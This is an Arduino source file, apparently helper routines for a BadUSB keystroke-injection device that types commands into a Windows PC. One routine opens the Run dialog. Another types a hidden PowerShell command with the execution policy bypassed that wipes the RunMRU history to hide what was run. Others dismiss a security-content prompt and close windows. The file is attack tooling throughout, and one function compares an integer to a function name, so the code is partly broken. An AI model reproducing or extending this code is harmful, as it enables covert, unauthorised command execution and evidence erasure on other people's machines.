#include<Keyboard.h>

void guir(int timetostart) {
  delay(timetostart);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
}
void enter(int timetowait) {
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(timetowait);
}
void clearpowershellhistory() {
  Keyboard.print("powershell -WindowStyle Hidden -Exec ");
  delay(300);
  Keyboard.print("Bypass 'Remove-ItemProperty ");
  delay(200);
  Keyboard.print("-Path 'HKCU:");
  delay(300);
  Keyboard.print("/Software/Microsoft/Windows/CurrentVer");
  delay(300);
  Keyboard.print("sion/Explorer/RunMRU' -Name");
  delay(200);
  Keyboard.print("'*' -Error");
  delay(300);
  Keyboard.print("Action SilentlyContinue");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}
void changelanguage() {
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.releaseAll();
  delay(500);
}
void typekey(int key)
{
  if ( key == enter){
    key = KEY_RETURN;
  }else{
    //do nothing
  }
  Keyboard.press(key);
  Keyboard.releaseAll();
  delay(200);
}
void altf4(){
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  delay(500);
}

void DisableNotifyAboutSecureContent(){
  delay(1000);
  Keyboard.begin();
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.end();
}
